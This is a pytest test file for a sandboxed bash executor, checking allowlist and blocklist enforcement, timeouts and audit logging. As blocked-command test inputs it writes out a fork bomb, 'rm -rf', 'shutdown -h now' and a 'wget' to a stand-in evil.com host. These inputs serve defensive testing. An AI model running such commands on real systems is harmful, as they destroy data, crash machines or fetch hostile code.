"""Tests for the sandboxed bash executor."""

import pytest

from den.agentfile.schema import BashConfig
from den.core.bash_executor import BashExecutor


@pytest.fixture
def executor():
    config = BashConfig(
        enabled=True,
        allowed_commands=["python3", "pip", "echo", "ls", "cat"],
        blocked_commands=["rm -rf", "sudo"],
        timeout="10s",
    )
    return BashExecutor(config)


@pytest.fixture
def disabled_executor():
    return BashExecutor(BashConfig(enabled=False))


class TestBashBlocking:
    def test_disabled_bash(self, disabled_executor):
        result = disabled_executor.execute("ls")
        assert result.blocked
        assert "disabled" in result.stderr.lower()

    def test_blocks_fork_bomb(self, executor):
        result = executor.execute(":(){ :|:& };:")
        assert result.blocked
        assert "dangerous pattern" in result.block_reason

    def test_blocks_shutdown(self, executor):
        result = executor.execute("shutdown -h now")
        assert result.blocked

    def test_blocks_agentfile_denied(self, executor):
        result = executor.execute("rm -rf /tmp/test")
        assert result.blocked
        assert "blocked" in result.block_reason

    def test_blocks_sudo(self, executor):
        result = executor.execute("sudo apt install something")
        assert result.blocked

    def test_blocks_unlisted_command(self, executor):
        result = executor.execute("wget http://evil.com")
        assert result.blocked
        assert "not in allowed_commands" in result.block_reason


class TestBashExecution:
    def test_allowed_command(self, executor):
        result = executor.execute("echo hello world")
        assert not result.blocked
        assert result.exit_code == 0
        assert "hello world" in result.stdout

    def test_ls(self, executor):
        result = executor.execute("ls /tmp")
        assert not result.blocked
        assert result.exit_code == 0

    def test_python(self, executor):
        result = executor.execute("python3 -c 'print(2+2)'")
        assert not result.blocked
        assert "4" in result.stdout

    def test_nonzero_exit(self, executor):
        result = executor.execute("python3 -c 'exit(1)'")
        assert not result.blocked
        assert result.exit_code == 1

    def test_timeout(self):
        config = BashConfig(
            enabled=True,
            allowed_commands=["sleep"],
            timeout="1s",
        )
        executor = BashExecutor(config)
        result = executor.execute("sleep 10", timeout=1)
        assert result.timed_out
        assert result.exit_code == 124


class TestBashAudit:
    def test_audit_log(self, executor):
        executor.execute("echo test")
        executor.execute("sudo bad")
        log = executor.get_audit_log()
        assert len(log) == 2
        assert log[0]["blocked"] is False
        assert log[1]["blocked"] is True

    def test_audit_contains_timestamp(self, executor):
        executor.execute("echo hi")
        log = executor.get_audit_log()
        assert log[0]["timestamp"] > 0
        assert log[0]["command"] == "echo hi"


class TestNoAllowlist:
    def test_no_allowlist_runs_anything(self):
        """When no allowed_commands specified, only blocked patterns apply."""
        config = BashConfig(enabled=True, allowed_commands=[], blocked_commands=["sudo"])
        executor = BashExecutor(config)
        result = executor.execute("echo free")
        assert not result.blocked
        assert "free" in result.stdout
